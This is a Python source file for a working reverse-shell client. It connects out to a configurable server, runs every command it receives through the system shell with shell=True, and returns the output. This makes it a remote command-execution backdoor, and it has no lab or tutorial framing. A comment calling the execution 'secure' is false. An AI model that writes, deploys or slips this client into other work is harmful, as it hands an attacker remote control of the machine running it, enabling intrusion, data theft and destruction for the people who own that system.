import socket
import subprocess
import logging

# Configuration
SERVER_IP = '127.0.0.1'
PORT = 8080
DELIMITER = "<END>"  # Delimiter to indicate message boundaries

# Logging setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")


def recv_until_end(sock, delimiter):
    """
    Receives data from the socket until the delimiter is found.
    """
    data = b''
    while True:
        try:
            chunk = sock.recv(10000)
            if not chunk:  # Connection closed
                break
            data += chunk
            if delimiter.encode() in data:
                break
        except socket.error as e:
            logging.error(f"Socket error during recv: {e}")
            break
    return data.decode().replace(delimiter, "")


def send_message(sock, message, delimiter):
    """
    Sends a message to the server with a delimiter.
    """
    try:
        full_message = message + delimiter
        sock.sendall(full_message.encode())
        logging.info("Message sent successfully")
    except socket.error as e:
        logging.error(f"Socket error during send: {e}")


def execute_command(command):
    """
    Executes a command on the client and returns the output.
    """
    try:
        # Run the command securely
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"


def connect_to_server():
    """
    Connects to the server and handles the communication.
    """
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect((SERVER_IP, PORT))
        logging.info(f"[+] Connected to the server at {SERVER_IP}:{PORT}")

        while True:
            # Receive the command from the server
            command = recv_until_end(client_socket, DELIMITER)
            if not command:  # If no command received, exit
                logging.info("No command received, closing connection.")
                break

            logging.info(f"Received command: {command}")

            # Execute the command and get the output
            output = execute_command(command)

            # Send the output back to the server
            send_message(client_socket, output, DELIMITER)
    except Exception as e:
        logging.error(f"[-] Error: {e}")
    finally:
        logging.info("[-] Disconnected from the server")
        client_socket.close()


if __name__ == "__main__":
    connect_to_server()

